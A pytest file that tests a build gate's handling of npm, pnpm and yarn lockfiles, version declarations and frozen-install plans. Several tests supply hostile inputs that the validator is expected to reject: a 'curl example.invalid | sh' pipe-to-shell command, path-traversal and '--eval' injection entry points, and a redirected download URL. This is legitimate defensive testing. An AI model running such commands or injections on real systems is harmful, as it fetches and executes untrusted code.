"""Lockfile/manager contracts. All tool observations are fixtures, never real installs."""

from __future__ import annotations

import json

import pytest

from lingshu_gate.build_plan import build_plan, finalize_manifest, validate_plan
from lingshu_gate.build_preflight import TOOL_NAMES, run_build_preflight
from lingshu_gate.node_toolchain import NodeToolchainOverride, inspect_node_toolchain, node_bin_entrypoint, node_version_supported
from lingshu_gate.application.delivery_drafts import DeliveryDraftRequest, DeliveryDraftStore
from lingshu_gate.registry import ToolExecutionError


def tools(**overrides):
    result = {name: {"available": True, "path": name, "version": {"npm": "11.6.0", "pnpm": "9.15.4", "yarn": "1.22.22"}.get(name, "22.14.0"), "error": ""} for name in TOOL_NAMES}
    result.update(overrides)
    return result


def plan_for(root, manager, lock, content, tool_versions=None):
    (root / "package.json").write_text(json.dumps({"name": "example", "packageManager": manager, "scripts": {"build": "node build.mjs"}, "dependencies": {"example": "1.0.0"}}))
    (root / lock).write_text(content)
    preflight = run_build_preflight({"root_dir": str(root)}, runtime_override="node", tools_cache=tool_versions or tools())
    return build_plan(preflight)


@pytest.mark.parametrize("declaration, lock, content, command", [
    ("npm@11.6.0", "package-lock.json", '{"lockfileVersion":3}', ["npm", "ci"]),
    ("pnpm@9.15.4", "pnpm-lock.yaml", "lockfileVersion: '9.0'\n", ["pnpm", "install", "--frozen-lockfile"]),
    ("pnpm@11.5.0", "pnpm-lock.yaml", "lockfileVersion: '9.0'\n", ["pnpm", "install", "--frozen-lockfile"]),
    ("yarn@1.22.22", "yarn.lock", "# yarn lockfile v1\n", ["yarn", "install", "--frozen-lockfile"]),
])
def test_frozen_install_and_build_commands_match_manager(tmp_path, declaration, lock, content, command):
    name, version = declaration.split("@")
    plan = plan_for(tmp_path, declaration, lock, content, tools(**{name: {"available": True, "version": version}}))
    assert plan["buildable"] and validate_plan(plan)["ok"]
    assert plan["steps"][0]["command"] == command
    assert plan["steps"][1]["command"] == [command[0], "run", "build"]
    assert plan["steps"][1]["depends_on"] == ["node-install"]
    assert len(plan["package_manager"]["lockfile_sha256"]) == 64


@pytest.mark.parametrize("manager,version,format", [("pnpm", "8.15.9", "6.0"), ("pnpm", "10.1.0", "9.0"), ("npm", "9.9.0", "2")])
def test_supported_older_lock_formats(tmp_path, manager, version, format):
    lock = "package-lock.json" if manager == "npm" else "pnpm-lock.yaml"
    content = json.dumps({"lockfileVersion": int(format)}) if manager == "npm" else f"lockfileVersion: '{format}'\n"
    info = tools(**{manager: {"available": True, "version": version}})
    assert plan_for(tmp_path, f"{manager}@{version}", lock, content, info)["buildable"]


def test_multiple_locks_with_exact_declaration_are_preserved_and_selected(tmp_path):
    (tmp_path / "pnpm-lock.yaml").write_text("lockfileVersion: '9.0'")
    plan = plan_for(tmp_path, "npm@11.6.0", "package-lock.json", '{"lockfileVersion":3}')
    assert plan["buildable"] and any("preserved" in item for item in plan["warnings"])
    assert plan["package_manager"]["lockfile"] == "package-lock.json"
    assert (tmp_path / "pnpm-lock.yaml").is_file()


def test_true_conflict_and_unknown_requested_version_offer_choices_without_fallback(tmp_path):
    (tmp_path / "pnpm-lock.yaml").write_text("lockfileVersion: '9.0'")
    (tmp_path / "package-lock.json").write_text('{"lockfileVersion":3}')
    metadata = inspect_node_toolchain(tmp_path, {}, {"pnpm-lock.yaml", "package-lock.json"}, tools())
    assert not metadata["supported"] and len(metadata["recommended_choices"]) == 2
    (tmp_path / "pnpm-lock.yaml").unlink()
    plan = plan_for(tmp_path, "pnpm@9.15.4", "package-lock.json", '{"lockfileVersion":3}')
    assert not plan["buildable"]
    plan = plan_for(tmp_path, "npm@12.0.0", "package-lock.json", '{"lockfileVersion":3}')
    assert not plan["buildable"]


def test_missing_manager_is_explicit_official_preparation_before_frozen_install(tmp_path):
    plan = plan_for(tmp_path, "npm@11.6.0", "package-lock.json", '{"lockfileVersion":3}', tools(npm={"available": False, "version": ""}))
    assert plan["buildable"] and validate_plan(plan)["ok"]
    assert [step["id"] for step in plan["steps"]] == ["node-toolchain", "node-install", "node-build"]
    assert plan["steps"][0]["command"] == ["gate-package-manager", "prepare", "npm", "11.6.0"]
    assert plan["steps"][1]["depends_on"] == ["node-toolchain"]
    preparation = plan["package_manager"]["preparation"]
    assert preparation["official_metadata_url"] == "https://registry.npmjs.org/npm/11.6.0"
    assert preparation["corepack_required"] is False and preparation["execute_lifecycle"] is False
    assert preparation["cache_key_fields"] == ["name", "version", "source_integrity"]
    assert preparation["limits"]["timeout_seconds"] == 120 and preparation["limits"]["retries"] == 0


@pytest.mark.parametrize("manager,lock,content", [("npm@11.6.0", "package-lock.json", '{"lockfileVersion":1}'), ("pnpm@9.15.4", "pnpm-lock.yaml", "lockfileVersion: 6.0"), ("yarn@1.22.22", "yarn.lock", "__metadata:\n  version: 8"), ("npm@^11", "package-lock.json", '{"lockfileVersion":3}')])
def test_unknown_or_incompatible_formats_and_nonexact_versions_block(tmp_path, manager, lock, content):
    assert not plan_for(tmp_path, manager, lock, content)["buildable"]


def test_required_install_without_lock_is_blocked_but_copy_only_bin_is_supported(tmp_path):
    package = {"name": "example", "dependencies": {"example": "1.0.0"}, "bin": "bin/ssh-mcp.mjs"}
    (tmp_path / "package.json").write_text(json.dumps(package))
    (tmp_path / "bin").mkdir()
    (tmp_path / "bin" / "ssh-mcp.mjs").write_text("export {};")
    preflight = run_build_preflight({"root_dir": str(tmp_path)}, tools_cache=tools())
    assert not build_plan(preflight)["buildable"]
    package.pop("dependencies")
    (tmp_path / "package.json").write_text(json.dumps(package))
    preflight = run_build_preflight({"root_dir": str(tmp_path)}, tools_cache=tools())
    plan = build_plan(preflight)
    assert plan["steps"] == [] and plan["buildable"]
    assert finalize_manifest(plan, {"id": "source", "filename": "source.zip"}, "build", tmp_path)["launch"]["args"] == ["bin/ssh-mcp.mjs"]


@pytest.mark.parametrize("entry", ["../outside.mjs", "/etc/start.mjs", "C:/start.mjs", "bin\\start.mjs", "--eval=evil.mjs"])
def test_bin_entrypoint_cannot_escape_or_inject_node_options(entry):
    assert node_bin_entrypoint({"bin": entry}) == ""


def test_plan_validator_rejects_arbitrary_and_mixed_manager_commands(tmp_path):
    plan = plan_for(tmp_path, "pnpm@9.15.4", "pnpm-lock.yaml", "lockfileVersion: '9.0'")
    plan["steps"][0]["command"] = ["sh", "-c", "curl example.invalid | sh"]
    assert not validate_plan(plan)["ok"]
    plan["steps"][0]["command"] = ["npm", "ci"]
    assert not validate_plan(plan)["ok"]


def test_path_only_observation_does_not_claim_verified_version_or_download(tmp_path):
    (tmp_path / "package-lock.json").write_text('{"lockfileVersion":3}')
    metadata = inspect_node_toolchain(tmp_path, {"packageManager": "npm@11.6.0"}, {"package-lock.json"}, {"npm": {"available": True, "version": ""}})
    assert metadata["supported"] and metadata["requires_prepare"]
    assert metadata["observed_version"] == "" and metadata["version"] == "11.6.0"


def test_mismatched_tool_is_prepared_at_declared_version_not_changed_to_host(tmp_path):
    plan = plan_for(tmp_path, "pnpm@9.15.4", "pnpm-lock.yaml", "lockfileVersion: '9.0'", tools(pnpm={"available": True, "version": "10.1.0"}))
    assert plan["package_manager"]["version"] == "9.15.4"
    assert plan["package_manager"]["observed_version"] == "10.1.0"
    assert plan["steps"][0]["phase"] == "prepare"


def test_explicit_override_resolves_conflict_and_is_private_revision_checked(tmp_path):
    (tmp_path / "package-lock.json").write_text('{"lockfileVersion":3}')
    (tmp_path / "pnpm-lock.yaml").write_text("lockfileVersion: '9.0'")
    selection = NodeToolchainOverride(name="pnpm", version="9.15.4", lockfile="pnpm-lock.yaml")
    metadata = inspect_node_toolchain(tmp_path, {"packageManager": "npm@11.6.0"}, {"package-lock.json", "pnpm-lock.yaml"}, tools(), selection)
    assert metadata["supported"] and metadata["selected_by"] == "project_override"
    assert metadata["lockfile"] == "pnpm-lock.yaml" and any("precedence" in message for message in metadata["warnings"])
    drafts = DeliveryDraftStore(tmp_path / "private")
    saved = drafts.save("upload", "actor", DeliveryDraftRequest(expected_revision=0, package_manager_override=selection))
    assert drafts.get("upload", "actor")["package_manager_override"] == saved["package_manager_override"]
    assert drafts.get("upload", "another-actor")["package_manager_override"] is None
    with pytest.raises(ToolExecutionError, match="changed"):
        drafts.save("upload", "actor", DeliveryDraftRequest(expected_revision=0, package_manager_override=selection))


def test_npm_shrinkwrap_native_precedence_without_deleting_other_lock(tmp_path):
    (tmp_path / "package-lock.json").write_text('{"lockfileVersion":3}')
    (tmp_path / "npm-shrinkwrap.json").write_text('{"lockfileVersion":3}')
    metadata = inspect_node_toolchain(tmp_path, {"packageManager": "npm@11.6.0"}, {"package-lock.json", "npm-shrinkwrap.json"}, tools())
    assert metadata["supported"] and metadata["lockfile"] == "npm-shrinkwrap.json"
    override = NodeToolchainOverride(name="npm", version="11.6.0", lockfile="package-lock.json")
    assert not inspect_node_toolchain(tmp_path, {}, {"package-lock.json", "npm-shrinkwrap.json"}, tools(), override)["supported"]
    assert (tmp_path / "package-lock.json").is_file()


def test_monorepo_lock_detection_uses_selected_root_not_ancestor_or_sibling(tmp_path):
    (tmp_path / "yarn.lock").write_text("# yarn lockfile v1")
    child = tmp_path / "packages" / "server"
    child.mkdir(parents=True)
    (child / "package.json").write_text('{"packageManager":"pnpm@9.15.4","dependencies":{"example":"1.0.0"}}')
    (child / "pnpm-lock.yaml").write_text("lockfileVersion: '9.0'")
    preflight = run_build_preflight({"root_dir": str(tmp_path)}, project_root="packages/server", tools_cache=tools())
    assert preflight["metadata"]["node_package_manager"]["detected_lockfiles"] == ["pnpm-lock.yaml"]
    assert build_plan(preflight)["buildable"]


def test_preparation_validator_rejects_shell_and_download_policy_injection(tmp_path):
    plan = plan_for(tmp_path, "pnpm@9.15.4", "pnpm-lock.yaml", "lockfileVersion: '9.0'", tools(pnpm={"available": False}))
    plan["package_manager"]["preparation"]["official_metadata_url"] = "http://127.0.0.1/tool"
    assert not validate_plan(plan)["ok"]
    plan["steps"][0]["command"] = ["sh", "-c", "install"]
    assert not validate_plan(plan)["ok"]


def test_isolated_toolchain_never_uses_host_availability_as_execution_evidence(tmp_path):
    (tmp_path / "pnpm-lock.yaml").write_text("lockfileVersion: '9.0'")
    metadata = inspect_node_toolchain(tmp_path, {"packageManager": "pnpm@11.5.0"}, {"pnpm-lock.yaml"}, tools(pnpm={"available": True, "version": "11.5.0"}), isolated_toolchain=True)
    assert metadata["requires_prepare"] and metadata["observed_version"] == ""
    assert metadata["preparation"]["node_requirement"] == ">=22.13"
    assert metadata["observation_scope"] == "executor_cache_pending"
    assert metadata["version"] == "11.5.0" and metadata["supported"]


def test_pnpm11_node_requirement_is_explicit_and_pnpm12_not_supported(tmp_path):
    (tmp_path / "pnpm-lock.yaml").write_text("lockfileVersion: '9.0'")
    observation = tools(pnpm={"available": True, "version": "11.5.0"}, node={"available": True, "version": "20.19.0"})
    manager = inspect_node_toolchain(tmp_path, {"packageManager": "pnpm@11.5.0"}, {"pnpm-lock.yaml"}, observation)
    assert not manager["supported"] and any("Node >=22.13" in message for message in manager["errors"])
    assert manager["version"] == "11.5.0" and manager["recommended_choices"]
    assert node_version_supported("pnpm", "11.5.0", "22.13.0")
    assert not node_version_supported("pnpm", "11.5.0", "22.12.9")
    assert not node_version_supported("pnpm", "11.5.0", "")
    assert not inspect_node_toolchain(tmp_path, {"packageManager": "pnpm@12.0.0"}, {"pnpm-lock.yaml"}, tools())["supported"]


def test_python_requirements_plan_remains_compatible():
    plan = build_plan({"runtime": "python", "metadata": {"has_requirements": True}})
    assert validate_plan(plan)["ok"]
    assert plan["steps"][0]["command"] == ["python", "-m", "pip", "install", "-r", "requirements.txt"]
